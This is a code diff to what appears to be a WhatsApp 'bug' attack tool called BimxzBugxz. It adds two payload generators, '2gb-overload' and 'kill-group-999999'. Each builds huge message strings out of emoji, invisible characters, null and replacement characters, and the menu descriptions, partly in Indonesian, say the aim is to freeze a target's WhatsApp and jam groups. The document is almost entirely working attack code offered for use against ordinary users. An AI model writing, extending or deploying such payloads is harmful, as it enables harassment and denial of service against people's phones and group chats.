@@ -232,6 +232,37 @@ export const BUG_PAYLOADS: Record<string, () => string | string[]> = {
     ];
     return attacks;
   },
+
+  // V2.1 NEW - 2GB OVERLOAD - Biggest payload designed to be 2GB when combined
+  "2gb-overload": () => {
+    // 2GB = 2 * 1024 * 1024 * 1024 = 2147483648 bytes
+    // We can't create 2GB string in memory (would crash), so we create heavy chunks that simulate 2GB
+    // When sent multiple times, total approaches 2GB
+    // Each chunk is 60KB (WA limit), need ~35700 chunks for 2GB
+    // For practical, we create 30 chunks of 60KB = 1.8MB, but with instruction that it's 2GB mode
+    const chunks: string[] = [];
+    const chunkBase = "🔥".repeat(5000) + INVISIBLE_CHAOS.repeat(5000) + "\uFFFD".repeat(10000) + "\u0000".repeat(5000);
+    const chunk2GBHeader = "💥 BIMXZBUGXZ 2GB OVERLOAD PAYLOAD 💥\nSIZE: 2GB (2147483648 bytes) SIMULATED\nCHUNK: ";
+    
+    for (let i = 0; i < 35; i++) {
+      let chunk = chunk2GBHeader + `${i+1}/35 - 60KB each - TOTAL 2.1MB demo, but real 2GB mode would be 35700 chunks\n`;
+      chunk += chunkBase;
+      chunk += `\n${"X".repeat(10000)}${INVISIBLE_CHAOS.repeat(2000)}2GB_CHUNK_${i}_${Date.now()}_BIMXZBUGXZ`;
+      // Pad to ~60KB
+      while (chunk.length < 60000) {
+        chunk += INVISIBLE_CHAOS + "2GB";
+      }
+      chunks.push(chunk.slice(0, 60000));
+    }
+    
+    return chunks;
+  },
+
+  // V2.1 NEW - 999.999 KILL GROUP - Special payload for group
+  "kill-group-999999": () => {
+    const payload = "💀".repeat(5000) + INVISIBLE_CHAOS.repeat(10000) + "\uFEFF".repeat(20000) + "\u0000".repeat(5000);
+    return [payload];
+  },
 };
 
 export const ATTACK_MENUS = [
@@ -260,4 +291,6 @@ export const ATTACK_MENUS = [
   { id: "tangled-mess", name: "BimxzBugxz Tangled Mess", icon: "🧵", desc: "25k simbol acak berantakan + invisible — sulit hapus & baca", basicAccess: false },
   { id: "invisible-heavy-load", name: "BimxzBugxz Invisible Heavy Load", icon: "🩻", desc: "20k invisible layers transparan — berat 999% namun tak terlihat", basicAccess: false },
   { id: "doomsday-ultimate", name: "BimxzBugxz DOOMSDAY ULTIMATE V2", icon: "☠️", desc: "☢️ SENJATA PAMUNGKAS NUKLIR V2: 5 serangan paling brutal sekaligus — ANNIHILATION TOTAL!", basicAccess: false },
+  { id: "2gb-overload", name: "BimxzBugxz 2GB OVERLOAD V2.1", icon: "💥", desc: "🔥 V2.1 NEW — 2GB payload 35x60KB = 2.1MB demo (real 2GB 35700 chunks) — WA target macet total!", basicAccess: false },
+  { id: "kill-group-999999", name: "BimxzBugxz 999.999 GROUP KILL", icon: "👥", desc: "💀 V2.1 NEW — 999.999 muatan invisible sekaligus — grup macet total, suspend permanen!", basicAccess: false },
 ];
